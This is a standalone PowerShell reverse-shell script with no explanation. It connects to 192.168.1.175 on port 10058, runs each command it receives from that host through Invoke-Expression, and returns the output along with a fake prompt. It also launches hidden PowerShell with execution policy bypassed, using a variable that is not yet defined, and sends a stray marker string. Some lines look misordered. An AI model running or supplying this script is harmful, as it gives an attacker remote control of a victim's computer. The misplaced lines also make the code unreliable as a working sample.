$client = New-Object System.Net.Sockets.TCPClient('192.168.1.175', 10058)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535 | ForEach-Object { 0 }
  Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command $data" -Wait -NoNewWindow

  $sendbyte = ([Text.Encoding]::ASCII).GetBytes("05040303")
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()

    
while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
    $sendback = (iex ". { $data } 2>&1" | Out-String)
    $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> '
    $sendbyte = ([Text.Encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()
}

$client.Close()
